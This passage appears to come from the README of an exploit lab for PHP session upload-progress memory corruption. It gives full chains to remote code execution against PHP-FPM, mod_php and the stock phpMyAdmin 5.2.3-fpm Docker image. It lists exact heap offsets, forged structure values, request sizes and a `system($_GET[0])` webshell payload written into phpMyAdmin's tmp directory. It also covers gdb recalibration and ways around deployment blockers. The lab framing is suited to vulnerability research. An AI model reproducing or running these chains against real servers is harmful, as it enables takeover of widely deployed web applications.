  That is why `wait_target()` is only ever called *before* an arm, and why `disarm()` is
  `2 × WORKERS` hits on `/plain.php` — every child is walked twice and the starting point
  of the cycle is the same afterwards.
* R2a and R2b each kill the child they run on; R3 has to survive long enough to write the
  file.  One arming round therefore covers `min(3, WORKERS)` stages: `WORKERS>=3` finishes
  all three in one round, 2 needs a re-arm before R3, and 1 re-arms per stage — which is
  exactly the single-worker sequence above.
* A stage that lands on an unarmed child is not a no-op: that request finishes normally
  and `upload_progress.cleanup` deletes the payload record, so the chain has to restart.
  The PoC handles it by retrying with **fresh session ids** (`scal` → `scal1`…, `asx0` →
  `asx01`…) instead of continuing on a half-patched session.  Pool mode defaults to
  `ATTEMPTS=3`, single-worker to 1.
* Measured 2026-10-24: 4 static children, one arming round covering all three stages,
  green twice — 42.3 s on a fresh container (every shaping request answered 200) and
  43.2 s after `fpm-down`/`fpm-up` (`R2a -> 502`, the armed child really did abort).
  The status code tracks flushing, as the gotcha below says, so success stays
  "the written shell echoes something" rather than a code.

## The chain (3) — upstream phpMyAdmin 5.2.3-fpm (stock 512M)

`exploits/pma512_rce.py`.  The victim is the official
`phpmyadmin/phpmyadmin:5.2.3-fpm` (PHP 8.3.26) started exactly as published: the
site is real phpMyAdmin, the attack surface is its `/index.php`, and
`memory_limit=512M`, `post_max_size=upload_max_filesize=2048K`,
`max_input_vars=10000`, `session.use_strict_mode=On` and the `[www]` pool
(`pm = dynamic`, `start_servers = 2`, `max_children = 5`) are all the image's own
values — nothing is lowered.  The front end's `client_max_body_size 2m` is the
room the image itself asks for through `UPLOAD_LIMIT=2048K`.  The write target
`/var/www/html/tmp` is phpMyAdmin's own maintained temp directory, shipped
`drwxrwxrwt`; whether it can be executed depends on the front end — our sidecar,
like the calibration environment, hands the whole site root to PHP through one
`location ~ \.php$`, so the path is reachable.  That is a property of the front
end, not of the image, and it is listed under Victim requirements for that reason.
The mechanism is the same as chain (2) (a pre-RINIT upload-progress decode leaves
`BG(unserialize)` dangling); only three things are new.

**The pressure source becomes the session file.**  A 2 MB body cap rules out
filling 512M in one request, so the heap is filled by a session file grown
record by record to **100,566,855 bytes** (R0).  Each record is an ordinary
upload-progress request: `PHP_SESSION_UPLOAD_PROGRESS=<key>` plus a file part; at
that part's `FILE_START` the session is decoded and flushed — which persists the
record — and immediately afterwards a wall of nested `filename=""` parts
(`x<k>[a][a]…`, depth 60) OOMs the body parser, so `cleanup` never runs, the
record stays, and the worker is respawned.  The wall size is computed client-side
as `512M − 2 × tracked file length`, each record's length follows from the
serialized layout of `upload_progress_<key>|a:5:{…}` plus the digit counts, and
the read position is simulated from the 5 KiB multipart buffer, so the final byte
count is reached without asking the server for any feedback (a `stat` check agreed
on every run, `match=True`).  208 records in total: 1 seed + 73 short-filename
records (316 B) + 134 records with a 750 KB filename, the last one's filename
length solved so the sum lands exactly on the target.  The seed request
deliberately presents an id whose file does not exist (`PHPSESSID=seed0`):
`use_strict_mode` throws it away and hands back one PHP allocated itself, so A
contains nothing but upload-progress records — no phpMyAdmin-owned fields in
front of them, which is what makes both the byte-for-byte sizing and the heap
layout the stage aims at reproducible.

**Arming happens inside somebody else's `session_start()`** (R3).  phpMyAdmin
calls it at script level (`libraries/classes/Session.php`), not pre-RINIT, so the
chain first fills the heap with 8150 nested field names (2,003,799 bytes, right at
the 2048K limit) and then lets the script-level decode read the 100 MB file:
measured `wall ≈ 423,624,704 B` + `A decode ≈ 243,175,424 B` breaks
536,870,912 inside `php_var_unserialize()`, `zend_first_try` in
`php_execute_script()` absorbs the fatal — the worker survives with
`BG(unserialize)` still at level 1, pointing at the freed `php_unserialize_data`.
**The prime has to answer 200 for the worker to be armed** (it must not die), and
arm only works on a cold opcache, so R2 reloads the pool (`kill -USR2 1`) first
and makes the prime the new child's first phpMyAdmin request.

**The session content is the carrier, and the target path is forged** (R1 + R4).
The stage does not use a file we wrote: it is produced through phpMyAdmin's own
login flow — GET `/index.php` for the CSRF token, then a multipart login POST
carrying an **880,000-byte `guid`**, which phpMyAdmin stores as a `$_SESSION` key,
so the resulting file is a buffer whose byte at every offset we know.  The guid
starts at file offset 125, and four things are overwritten inside it:
`DT_OFF=528360` → 8 zero bytes (`var_dtor_entries.used_slots = 0`), `+0x50` → 24
(the fake `zend_string`'s `len` = `len("/var/www/html/tmp/x.php")+1`), `+0x58` →
the path with its terminating NUL, `E_OFF=856040` → `AIM_U=-108596`
(`var_entries.used_slots`).  The stage body is 1,060,409 bytes: 4172 nested field
names shape chunk K to the calibrated pages, 300 fields with 15-byte values
(`zend_string_alloc(15)` = 40 B → allocator bin 4) prewarm it, and 6 re-sent names
free six bin-4 slots for the progress array's own key strings, which is what parks
`ps_files` at its measured offset (`K+0x82e88`).  Then
`PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[0]); ?>` plus a file part triggers
the pre-RINIT decode — of that 880 KB session.  `s_read` allocates the whole file
as one buffer at `K+0x86018` (page 134), which carries the forged bytes over `DT`
(p263) and `E` (p343) while `D_A` (p435) stays outside; with `used_slots` rewritten
by the guid, the five pushes land on `ps_files` at `−24/−16/−8/+0/+8`, so `basedir`
becomes the fake `zend_string` forged at `DT+0x40`.  `php_session_flush()` then
takes `ps_files_open()`'s reopen path, builds the path from the fake basedir,
`open()` stops at the embedded NUL, and the session text — payload record
included — is `pwrite`n to `/var/www/html/tmp/x.php` (880,503 bytes).  The attempt
that hits the armed worker answers **502** (the child dies after writing); the
others answer 200, since unarmed children just save their own session.

**The pool is not pinned, so each attempt gets its own session** (R4).
`BG(unserialize)` is per-process and `pm = dynamic` does not fix the number of
live children, while phpMyAdmin owns the id rotation — so the chain mints
`ATTEMPTS=6` crafted sessions up front and fires the same stage body once per sid.
The one that reaches the armed child writes the shell; the rest are harmless.
`GET /tmp/x.php?0=id` returns `uid=33(www-data)`.

Measured 5/5: green on a fresh container and again after `pma-down`/`pma-up`
recreated both containers.  ~154 s end to end, ~147 s of it in R0 (208 records,
each of which has to wait for FPM to hand back a live child).

## Constants

| item | value |
| --- | --- |
| `zif_system` | `libphp + 0x457FE0` |
| `zval_ptr_dtor` | `libphp + 0x64B890` |
| `R0` (expose_php=Off) | `chunk + 0x68140` |
| `R0` (expose_php=On) | `chunk + 0x752E0` |
| fake HashTable | `R0 + 0x28` (or the fixed `CMD` copy at `chunk + CMDOFF + 0x700`) |
| `CMDOFF` | `0x83118` Off, `0x84118` On, `0x7a118` under opcache |
| chunk size | `0x200000` (`ZEND_MM_CHUNK_SIZE`) |

### Constants (FPM chain, 8M)

| item | value | note |
| --- | --- | --- |
| `E_OFF` | `chunk + 0x76000` | stale `var_entries` block (= filler page 118, `ENTPAGE`) |
| `DT_OFF` | `chunk + 0xDC000` | stale `var_dtor_entries` block (= filler page 220, `DTPAGE`) |
| push targets | `0x63058` scalarize, `0x63050` fake array, `0x58190` session writer | `E_OFF + 16 + 8*used_slots` |
| `LAST_DELTA` | `-0x3BD0` | negative `used_slots`, aims the push backwards at `0x58190` |
| progress block | `chunk + 0x63000` | `php_session_rfc1867_progress`, 144 bytes |
| R3 fake string | `len(FPM_SHELL)+1` = `19`, value at `DT_OFF+0x38` | the length counts the trailing NUL: `ps_files_path_create()` memcpy's exactly `ZSTR_LEN(basedir)` bytes and `open()` stops at that NUL |
| filler field | `FILLER=540672` B starting at page `FSTART=100` | the fake blocks are patched at absolute chunk offsets |
| session records | `SMALL=73` + one `FNLEN=1000000` B filename | the `build_A()` prelude of prime |
| nested walls | `NESTED=890` / prime `PRIME_NESTED=300`, `LEVELS=60` | OOM before the END cleanup |
| prime request | `FILL_FIELDS=700` × `FILL_LEN=4000` + `DUP` repeated names | hits the 8M limit |
| ini | `memory_limit=8M`, `post_max_size=8M`, upload_progress On + cleanup On | `docker/fpm/php.ini`, nginx `client_max_body_size 8m` |

### Constants (FPM chain, 128M)

| item | value | note |
| --- | --- | --- |
| `E_OFF` | `chunk + 0x76000` | measured the same as on the 8M target; filler starts at page 100 |
| `DT_OFF` | `chunk + 0x7C000` | the stale `var_dtor_entries` block moves to page 124 (the filler is only 32 pages) |
| push targets | `0x63058` / `0x63050` / `0x58190` | identical to the 8M target, `aim(off) = (off - (E_OFF+16)) // 8` |
| filler field | `FILLER=131072` B (32 pages) starting at page `FSTART=100` | covers both `E_OFF` and `DT_OFF` |
| pressure parts | `PRESS=920` RFC1867 parts, `filename=""`, depth `LEVELS=60` | ~300 B per part buys ~128 KB of heap; enough to OOM the worker |
| prime pressure | `PRIME_PRESS=780` (< `PRESS`) | the parse must survive to reach `session_start()`, so the decode hits the limit |
| prime request | `FIELDS=170` × `FIELD_LEN=4000` + `DUP` repeated names | plugs the rest of the chunk |
| session records | `SMALL=73` small + `BIG=20` with `FNLEN=750000` B filenames | `build_A()`, 15,029,535 B on disk |
| request bodies | largest 1,022,503 B (A-big) | all under nginx's default `client_max_body_size 1m` |
| ini | `memory_limit=128M` (PHP's default), `post_max_size=8M`, upload_progress On + cleanup On | `docker/fpm128/php.ini`, nginx.conf leaves the body limit alone |
| `WORKERS` | 1 (`fpm128`) / 4 (`fpm4`) | live children that must be armed; `fpm4` uses `pm = static` + `pm.max_children = 4` in `docker/fpm4/php-fpm.conf` |
| `ATTEMPTS` | 1 single worker / 3 pool | whole-chain retries, each on fresh session ids (a stage that misses wipes the record) |
| `SETTLE` | 0.5 s | pause before an arming round so the killed children are back |

### Constants (phpMyAdmin 5.2.3-fpm, 512M)

| item | value | note |
| --- | --- | --- |
| `TARGET` | `100,566,855` B | length of session file A, assembled from 208 upload-progress records (1 seed + `NSMALL=73` at 316 B + 134 with a 750 KB filename, the last filename length solved to close the sum exactly) |
| `PRIME_N` | `8150` | nested field names; prime body 2,003,799 B, inside the stock `post_max_size=2048K` |
| what breaks the limit | wall `423,624,704` + decode `243,175,424` B | reported as `tried to allocate 753664 bytes`, raised inside `/var/www/html/libraries/classes/Session.php` |
| `NFF` / `NPW` / `NDUP` | `4172` / `300` / `6` | stage body 1,060,409 B: shaping fields / bin-4 prewarm / six freed bin-4 slots |
| `GLEN` / guid start | `880,000` / file offset `125` | the carrier is the `browser_access_time` key phpMyAdmin stores on login |
| `DT_OFF` / `E_OFF` | `528360` / `856040` | i.e. `DT − buffer` and `E − buffer`, so they are offsets inside the guid |
| `AIM_U` | `-108596` | `(ps_files − E − 40) / 8`, so that the 5th push lands on `basedir` |
| `ps_files` | `chunk + 0x82e88` | measured here; the published run had `+0x82cd0`, `0x1b8` = 440 B = 55 slots earlier |
| `s_read` buffer | `chunk + 0x86018` (page 134) | covers `DT` (p263) and `E` (p343); `D_A` (p435) stays outside |
| fake `zend_string` | `DT + 0x40`, `len` at `DT_OFF+0x50` = 24, bytes at `+0x58` | the length counts the trailing NUL, and `open()` stops at it |
| written file | `/var/www/html/tmp/x.php`, 880,503 B | the directory is shipped `drwxrwxrwt`; being executable is a property of the front end (ours serves `tmp/` to PHP) |
| ini / pool | all stock: `512M`, `2048K`, `max_input_vars=10000`, `use_strict_mode=On`, `pm = dynamic` / `start_servers = 2` / `max_children = 5` | the only start-up change is unloading the `uploadprogress` extension — see Victim requirements |
| `ATTEMPTS` / `SETTLE` | `6` / `0.35 s` | one crafted session per stage attempt; a pause after each A record so FPM returns a live child |

As on the self-built FPM targets, none of these is a leak: the layout inside a
chunk is byte-identical after `fork()`, so a container restart with a fresh ASLR
set changes nothing (verified).  Every one of them can be overridden by an
environment variable of the same name (`TARGET`, `PRIME_N`, `NFF`/`NPW`/`NDUP`,
`GLEN`, `DT_OFF`/`E_OFF`/`AIM_U`, `NSMALL`/`FNLEN`/`PER_PART`/`BODY_MAX`,
`ATTEMPTS`/`SETTLE`, `LIMIT`); after changing image tag or ini, re-measure
`ps_files` with the gdb twin described under "Gotchas that cost time".

Everything the PoC needs from the target is a leaked `chunk` and `libphp` base per
run, so ASLR and container restarts are irrelevant.  What is *not* portable is the
request shape: `R0`, the fill counts and `CMDOFF` are properties of this build,
this `php.ini` and this exact victim page.  `measure/` holds the gdb drivers that
produced them (`measure/gdb/gdb-psdump.py` reads the stale `PS()` globals after a
stage-A request, `measure/gdb/gdb-s3trace.py` traces
`track_init → reference_destroy → hash_destroy →
zif_system`), and `measure/dev_r0.py` shows how to re-measure `R0` for a new
layout.  `def_rce.py` accepts `BURN_SPEC/TAILB/TAILC/TAILD/DUPNAMES/CMDOFF/R0_OFF/
NFILL/FILLSZ/S3_BIGLEN` from the environment so a re-measurement does not need an
edit.

Every FPM constant is env-overridable under its own name too — on the 8M PoC
`E_OFF`/`SCALAR_PUSH`/`ARRAY_PUSH`/`LAST_DELTA`/`FILLER`/`FSTART`/`ENTPAGE`/
`DTPAGE`/`NESTED`/`PRIME_NESTED`/`LEVELS`/`SMALL`/`FNLEN`/`FILL_FIELDS`/`FILL_LEN`/
`DUP`, on the 128M PoC `E_OFF`/`DT_OFF`/`SCALAR_PUSH`/`ARRAY_PUSH`/`WRITER`/`FILLER`/
`FSTART`/`PRESS`/`PRIME_PRESS`/`FIELDS`/`FIELD_LEN`/`LEVELS`/`SMALL`/`BIG`/`FNLEN`/`DUP`,
and the pool orchestration adds `WORKERS`/`ATTEMPTS`/`SETTLE`
— so a new build or ini only needs a re-measurement.  And the FPM chain needs **no
leak at all**: the fake blocks, the progress
struct and the writer are all addressed chunk-relatively, and the layout inside a
chunk is byte-identical after `fork()`, so a container restart with a fresh ASLR
set changes nothing (verified).

## Victim requirements

**mod_php chain.**  Hard: PHP 8.4.x mod_php (prefork), `session.upload_progress.enabled=On` and
`.cleanup=On`, `session.use_cookies=On`, `session.use_strict_mode=Off`, the `files`
save handler with a writable `save_path`, `memory_limit` reachable by the fill.
Not hard any more: `display_errors` (both), `expose_php` (both),
`session.save_path` length (both), `memory_limit` (128M/256M/512M/1G),
`max_input_vars=1000` / `max_multipart_body_parts=-1` (the shipped defaults), ASLR,
opcache (`opc` profile: the `display_errors=On` producer plus `CMDOFF=0x7a118`),
a multi-worker pool (fan-out).
Real-world blockers: traffic limits in front of Apache (the saturating
`display_errors=Off` stage-1 A has a small body, ~1–2 MB, but consumes the whole
`memory_limit` of heap; the `display_errors=On` producer instead puts the fill in
the body — ~136 MB at 128M, ~1.3 GB at 1G; `off1g`'s stage-3 A streams the same kind
of 1.3 GB fill), header-size limits that truncate the
`Set-Cookie` leak, and any heap activity between the two requests of a stage — the
two requests of one stage must hit the same child, which is why the single-worker
profiles pin `MaxRequestWorkers=1` and `mw` instead fans one copy of each stage per
pool worker (default width = the profile's `MaxRequestWorkers`, override with `MWN`
or a trailing number on the `exploit` command line).
All children are forked from one parent, so they share the same
chunk and `libphp` bases and one leak is enough.

**FPM chain.**  Hard: PHP 8.4.x **PHP-FPM** (behind nginx or an Apache proxy —
anything that parses the body inside `sapi_activate()`), a page that actually
calls `session_start()` (or any other entry into `php_session_start()`),
`session.upload_progress.enabled=On` and `.cleanup=On`, the `files` save handler,
**a document root writable by `www-data`**.  This chain asks nothing of
`display_errors` or `expose_php`, uses no code pointer and needs no base leak.
Not hard any more: `memory_limit` (both 8M and PHP's stock 128M work), the front
end's body limit (the 128M variant keeps every request inside nginx's default 1m) and
the pool size (a 4-child `pm = static` pool is armed in one round, see the
multi-worker variant above).
Real-world blockers: the write target has to be web-reachable and writable; with
`pm.max_children` above 1 the `WORKERS` value has to match the number of **live**
children, and anything that changes the connection→worker mapping breaks the arming
round — `pm = dynamic`/`ondemand` let the live count drift with traffic, and
`fastcgi_keep_conn`/upstream keepalive or real third-party traffic reuse or add
connections; `session.upload_progress.freq`/
`min_freq` and the front end's `client_max_body_size` (the 8M variant needs it raised
to 8m, the 128M variant does not) change how many shaping requests the chain needs and
how they look.

**phpMyAdmin chain.**  The hard conditions are the same as the FPM chain above (body
parsed pre-RINIT, `upload_progress` On + cleanup On, the `files` handler, a
web-reachable directory writable by `www-data`), plus two specific to this image:

* **the PECL `uploadprogress` extension must not be loaded.**  The image ships it, and it
  installs its own multipart upload hook over PHP's `php_rfc1867_callback` without ever
  chaining the session module's handler — so `session.upload_progress` never initializes
  or flushes a session during an upload at all, and the very first A record disappears.
  `p2s.py pma-up` therefore starts the container with
  `rm -f /usr/local/etc/php/conf.d/docker-php-ext-uploadprogress.ini`; that is the
  **only** modification to how the image runs (`verify pma` reports
  `upext=unloaded`).
* **`tmp/` (or any writable directory the front end hands to PHP) must be
  web-reachable.**  Nothing has to change about the directory: phpMyAdmin ships
  `/var/www/html/tmp` as `drwxrwxrwt`.  Whether it is *executable* is a property of
  the front end — our sidecar, like the calibration environment, routes the whole
  site root through one `location ~ \.php$`, which is what makes the path work.  A
  production front end hardened against `tmp/` execution does not, so treat this as
  the same condition the FPM chain states (writable **and** served).
* Deployment side, same prerequisite as the self-built targets: opcache must still be
  cold before the prime (here: `kill -USR2 1` on the FPM master; in the field, whatever
  makes the next request a fresh child's first), and the front end must not cap the body
  below the image's own `UPLOAD_LIMIT=2048K`.
* Not a condition any more: any lowered ini (`512M`, `2048K`, `max_input_vars=10000` and
  `use_strict_mode=On` are all the vendor's values), a victim page of our own, a pinned
  `pm = static` pool, `display_errors` / `expose_php` (both are the compiled defaults
  here), a code pointer or a base leak, ASLR.

## Recycling

* `p2s.py prune [profile…]` deletes `/tmp/sess_*` and `/srv/out/*` inside each
  container and the matching host-side `out-<profile>/` files.  `exploit` does it
  before every run and clears the session files again afterwards (`P2S_CLEAN=1`),
  because stale session files make the next `s_read` OOM early and a stale proof
  makes a failure look like a success.  The proof file itself is kept as evidence.
* `p2s.py down [profile…]` removes the containers; `docker rmi p2s-php844` removes
  the image.  Nothing outside the lab directory is touched.
* `exploit`/`verify` re-create a container that vanished (external `docker prune`,
  a restarted daemon) instead of failing with a connection error.
* A stage-3 B is *expected* to kill the child: Apache's parent forks a fresh one,
  and the leaked bases stay valid because they are inherited across `fork()`.  If
  the parent itself dies, the leak is stale — `p2s.py up <profile>` before retrying.
* FPM chain: `p2s.py prune fpm fpm128 fpm4` clears each container's
  `/var/lib/php/sessions/sess_*` plus the `docker/<profile>/www/shell.php` the chain
  wrote (the document root is a host mount, so the webshell survives the container —
  `exploit fpm*` deletes it before and after), and the matching `out-fpm/` /
  `out-fpm128/` / `out-fpm4/` proof directories.
  `fpm-down [profile…]` removes the containers, `docker rmi p2s-php844-fpm` the image.
  Killing the worker during prime is expected here too; FPM replaces it immediately and
  both the stale globals and the chunk layout survive.
* phpMyAdmin chain: `p2s.py prune pma` deletes the container's `/sessions/sess_*`
  (A alone is 100 MB) plus the `/var/www/html/tmp/x.php` the chain wrote, and the
  host-side `out-pma/`.  `pma-down` removes `p2s-pma` and `p2s-pma-web`,
  `docker rmi phpmyadmin/phpmyadmin:5.2.3-fpm` removes the image (~400 MB).
  `exploit pma` runs the same cleanup before and after — a leftover A makes the next
  prime OOM early, a leftover `x.php` makes a failure look like a success.  Records
  and prime killing the worker are expected: the `[www]` pool respawns immediately,
  and `docker exec p2s-pma sh -c "kill -USR2 1"` only restores the cold-opcache state
  the heap constants were calibrated in.

## Rebuilding the victim binary

Prefer the shipped `docker/bin/libphp.so`: every constant above was measured on
that exact file (md5 `f402b493b1df82cbf34021b4aef133cb`).  A fresh clone does not
carry it (53 MB), so compile it yourself instead:

```bash
python p2s.py build --from-source                  # uses docker/src/php-src-844.tar
python p2s.py build --from-source --src <php-src>  # git-archives that checkout first
```

`--from-source` builds `docker/Dockerfile.builder` (ubuntu + the `-dev` packages
the calibrated binary links against), bind-mounts the source tar into a
`p2s-srcbuild` container and runs `docker/build-libphp.sh`, then copies the result
to `docker/staged/`:

* `docker/bin/libphp.so` is absent → the new build is installed there (a backup is
  kept as `libphp.so.calibrated` when one is present).
* otherwise the calibrated binary stays; swap manually or use `--install` /
  `P2S_INSTALL=1`.
* `docker/src/php-src-844.tar` is byte-identical to `git archive HEAD` of branch
  `PHP-8.4.4`, so it never has to be committed.

`python p2s.py offsets` then reads the *symbol* offsets out of the running
container (`docker/offsets.py` → `env/generated/offsets.env`), and `exploit` picks
them up automatically through `ZIF_OFF`/`DTOR_OFF`, so `zif_system` /
`zval_ptr_dtor` need no hand-editing after a rebuild.

What a rebuild does *not* give you for free is the heap layout: `R0_OFF`, `CMDOFF`
and the fill counts are properties of the build, the `php.ini` and the victim page,
and they are only obtainable with gdb against a live child:

```bash
python measure/dev_r0.py            # -> R0_OFF; Constants above for CMDOFF/fills
python p2s.py verify && python p2s.py exploit off   # the cheap proof the constants survived
```

Measured on 2026-10-22, this tree: a `build --from-source` binary (md5
`46ab96e6f85aecac36c4c4aafd5c5cd8`, so *not* byte-identical — the build directory
and DWARF differ) keeps `zif_system=0x457fe0` and `zval_ptr_dtor=0x64b890`, and after
swapping it in, `off`, `default`, `ub` and `opc` all still produced
`PROOF: uid=33(www-data)` with the calibrated `R0=chunk+0x68140` and
`htdata=chunk+0x83818` (= `CMDOFF+0x700`).  In other words: same source, same
configure command, same package versions ⇒ the calibration survives the rebuild.
The lab is nevertheless kept on the calibrated file, because the remaining ten
profiles were not re-run against the rebuilt one.

If you compile by hand instead, use exactly this configure command (it is what the
calibrated binary was built with — `strings docker/bin/libphp.so | grep
'./configure'` reproduces it, and `php -i` inside a container shows the same):

```
'./configure' '--with-apxs2=/usr/bin/apxs2' '--with-config-file-path=/usr/local/etc/php'
  '--with-mhash' '--enable-mbstring' '--enable-mysqlnd' '--with-password-argon2' '--with-sodium'
  '--with-pdo-sqlite=/usr' '--with-sqlite3=/usr' '--with-curl' '--with-iconv' '--with-openssl'
  '--with-readline' '--with-zlib' '--enable-opcache' '--disable-cgi' '--disable-phpdbg' '--with-pic'
```

`--with-config-file-path=/usr/local/etc/php` is why `ensure`/`create` mounts the
profile directory there as well as at `/srv/profile`.  `--with-readline` links GNU
readline (`libedit-dev` would produce a different binary, and `--with-apxs2` needs
`apache2-bin` for `/usr/sbin/apache2`), and installing an extra `-dev` package
(libzip, libicu, …) silently enables an extension and moves the heap layout — the
builder image deliberately installs only what
`objdump -p docker/bin/libphp.so | grep NEEDED` asks for.

### The FPM victim

`php-fpm` is not shipped either (again a 53 MB problem); `fpm-build` compiles it
from the same php-src:

```bash
python p2s.py fpm-build                    # uses docker/src/php-src-844.tar
python p2s.py fpm-build --src <php-src>    # or a checkout / tar of your own
```

It runs `docker/build-phpfpm.sh` in the same builder image, and the configure
command is part of the calibration:

```
./configure --disable-all --enable-fpm --enable-session \
    --disable-cgi --disable-cli --disable-phpdbg --prefix=/opt/phpfpm \
    CFLAGS='-g -O0 -fPIC'
```

`--disable-all` fixes the extension set and `-O0` fixes the allocation sequence of
request startup — the "Constants (FPM chain, 8M)" and "Constants (FPM chain, 128M)"
tables were measured on exactly that
combination, so changing either moves the block addresses inside the chunk.  The
result is `make install`ed to `/opt/phpfpm`, archived as
`docker/staged/phpfpm.tar`, unpacked to `docker/staged/phpfpm/` and `COPY`ed
verbatim by `Dockerfile.fpm`.  This chain has nothing to read via `p2s.py offsets`
— it uses no symbol offsets, only the `E_OFF`/`DT_OFF` block addresses.

Measured on 2026-10-23, this tree: the resulting `php-fpm` (md5
`4b6b73a350e09fcc791c0f20a95ca7d0`, links only libc/libm) completed the whole FPM
chain **on the first try**, with the block offsets matching the calibration — same
conclusion as for mod_php: same source, same configure command, same package
versions ⇒ the calibration survives the rebuild.  The 128M block addresses were
originally measured on a differently compiled `php-fpm` (same configure command,
different md5), and they worked first run on this `fpm-build` output too: the block
positions follow the configure command and the ini, not the build directory.

### The phpMyAdmin victim

The third chain **compiles nothing**: `pma-up` just `docker run`s the official
`phpmyadmin/phpmyadmin:5.2.3-fpm` — PHP 8.3.26, phpMyAdmin 5.2.3, site, ini, pool and
`/sessions` all as the vendor published them.  There is therefore also no question of
whether a calibration survives a rebuild: it follows the image *tag*.  Changing the tag
(or the image's `MEMORY_LIMIT` / `UPLOAD_LIMIT` env) means re-measuring `ps_files`, per
the gdb-twin recipe under "Gotchas that cost time".  The only argument the lab adds to
how the container starts is the removal of `docker-php-ext-uploadprogress.ini`.

## Gotchas that cost time

* `docker/www/index.php` must stay byte-identical to the calibrated page
  (`<?php echo "OK\n"; ?>` + newline, **22 bytes** — a real backslash, not a
  rendered newline).  Writing the file with `echo` produces a 21-byte page, the
  startup allocations shift by one byte and the `expose_php=On` stage3 silently
  stops landing on `R0`.
* With `apache2 -f <conf>`, `PHPIniDir` is ignored by this build; the ini has to
  sit at the compiled-in path, hence the double mount at `/usr/local/etc/php`.
* The image ships the prebuilt `libphp.so` because the calibrated offsets are only
  valid for a byte-identical binary; `build --from-source` is the fallback for a
  clone that has no 53 MB blob (see "Rebuilding the victim binary").
* Never attach gdb with breakpoints during a stage-A request: `SIGKILL`ing gdb
  leaves `int3` bytes in `libphp.so` (including inside the inlined
  `php_session_send_cookie`), which corrupts every later run.  Read-only batch
  probes (`-batch -p PID -x measure/gdb/gdb-psdump.py`, no breakpoints) are safe.
* In Git Bash, prefix `docker exec`/`docker cp` commands with `MSYS_NO_PATHCONV=1`
  so `/usr/...` arguments are not rewritten to Windows paths.
* 14 containers plus a 1 GB fill is a lot of VM memory; run `p2s.py up <subset>` if
  Docker Desktop starts killing containers.
* Both FPM pages are part of the calibration: `docker/fpm/www/index.php` must really
  call `session_start()` (39 bytes) and `plain.php` is the bare `echo` page
  (22 bytes) used only for shaping requests and the liveness poll.  `docker/fpm128/www/`
  and `docker/fpm4/www/` hold byte-identical copies.
* In the multi-worker orchestration **nothing may sit between the arming round and the
  three stages**, not even a liveness probe: a request that reaches script execution runs
  `PHP_RINIT(basic_functions)`, which clears the decoder that was just left dangling.
  So `wait_target()` is never called after an arm, and `disarm()` is `2 × WORKERS` hits on
  `/plain.php` — every child is walked twice and the cycle starts from the same place.
* `WORKERS` has to equal the number of **live** children.  With `pm = static` that is
  known (`fpm4` is 4); with `pm = dynamic` the live count drifts with traffic and an arm
  round can leave a stage uncovered.
* The N primes of one round must be **consecutive**: any other request in between (even
  building another session's A records) lets some child run RINIT after it was armed and
  it is unarmed again.  That is why every `build_A()` finishes before `arm()` starts.
* A stage on an unarmed child is not harmless: that request completes and
  `upload_progress.cleanup` deletes the payload record, so the chain has to start over.
  Pool mode therefore retries on fresh session ids (`ATTEMPTS`) rather than continuing on
  the same `sess_scal`.
* Killing the worker on the FPM shaping requests is **expected**, but the status code
  follows how much the child had already flushed: 502/500 on the 8M target, 200 on the
  128M one.  The PoC polls `/plain.php` until it answers 200 again before continuing,
  and success is the written shell echoing something — not a status code.
* On the 128M target `PRIME_PRESS=780` has to stay below `PRESS=920`: the point of prime
  is that `session_start()`'s decode hits the limit, not the body parser.  Too many
  parts and the request dies during parsing, `BG(unserialize)` never dangles and every
  later decode step does nothing.
* The 128M A-big request is 1,022,503 bytes, ~26 KB below nginx's default 1m
  (1,048,576) — keep `FNLEN` env-overridable, raising it silently starts returning 413.
* The FPM chain needs a writable document root, so `docker/<profile>/www` is mounted
  read-write and the `shell.php` it produces lands back on the host —
  `prune fpm fpm128 fpm4` (and the before/after cleanup inside `exploit fpm*`) is what
  removes it.
* In Git Bash `SHELL` already has a meaning, so it is a bad variable name for a PoC —
  the FPM write target is `FPM_SHELL`.
* The phpMyAdmin image ships PECL `uploadprogress`, which overrides PHP's
  `php_rfc1867_callback` and never chains the session module's handler.  The symptom is
  that not one A record survives while HTTP looks perfectly fine (200, `Set-Cookie`
  present).  Every byte of pressure in this chain comes from upload-progress flushing,
  so `pma_create()` deletes that ini first, and `verify pma`'s `upext=unloaded` is the
  check that it worked.
* Do not judge arming by "is A still there": the prime writes phpMyAdmin's own session
  back over the same file.  What does show it is the prime answering **200** (it must
  survive) together with the fatal inside its body — `Allowed memory size of
  536870912 bytes exhausted (tried to allocate 753664 bytes) in
  …/libraries/classes/Session.php` — raised *within* `session_start()`; and,
  conversely, the stage that hits the armed child answers **502**, because that child
  dies only after the write.  The image leaves `display_errors` at its compiled default
  `On`, so that text is readable straight from the response.
  `memory_get_peak_usage()` is cumulative per process and is not a per-request signal.
* `AIM_U` is the one constant on this image that does **not** transfer from the
  published run: `ps_files` lands at `chunk + 0x82e88` instead of `+0x82cd0`, i.e.
  `0x1b8` = 440 B = 55 slots further along, so the aim has to be `-108596` rather than
  `-108651` (`AIM_U = (ps_files − E − 40) / 8`).  The symptom is unmistakable: every
  stage answers 200 with a normal page, because the session simply saves into its own
  file.  To re-measure it, start a **twin** container (`--cap-add=SYS_PTRACE`, apt from
  the USTC mirror, gdb 16.3) and break on `php_var_unserialize_init` — it only stops
  when `level == 1`, so it catches exactly the stage decode.  Read `basic_globals` from
  `.dynsym` (`bg = &basic_globals + 0x358`, `level` at `bg+8`) and `ps_globals`
  (`mod = u64(ps_globals + 0x60)`), find the `s_read` buffer by searching the heap for
  `browser_access_time|a:1:{s:880000:"`, and `DT_OFF`, `E_OFF` and `AIM_U` fall out in
  one pass.  Never put breakpoints into the container the exploit runs against, and
  leave another lab's containers alone.
* The prime body, 2,003,799 bytes, sits just under the stock `post_max_size=2048K`
  (2,097,152), and the front end's `client_max_body_size 2m` is exactly the room the
  image's own `UPLOAD_LIMIT=2048K` asks for: raising `PRIME_N`, or A-big's `FNLEN`,
  silently turns into a 413 instead of "more heap".
* This target has **two** names for the session id: the pre-RINIT decode reads the ini
  default `PHPSESSID`, while phpMyAdmin calls `session_name("phpMyAdmin")` at script
  level, and which one is live depends on whether that child is serving its very first
  request — which HTTP cannot control.  So every request the parser has to see carries
  both names with the same value.
* `docker logs --since` needs a UTC timestamp **with the `Z`**, or FPM's
  `exit … (signal 6)` lines are filtered out and it looks as if no worker died.

## What was dropped from the original lab directory

The working directory held ~330 files.  Removed here: the obsolete
`hash_update`-based chains (`api/`, `fixed/`, `minimal/`, `reseed/`, `stale/`),
another agent's git clone (`ref_remote/`, 44 MB), the scraped Calif report
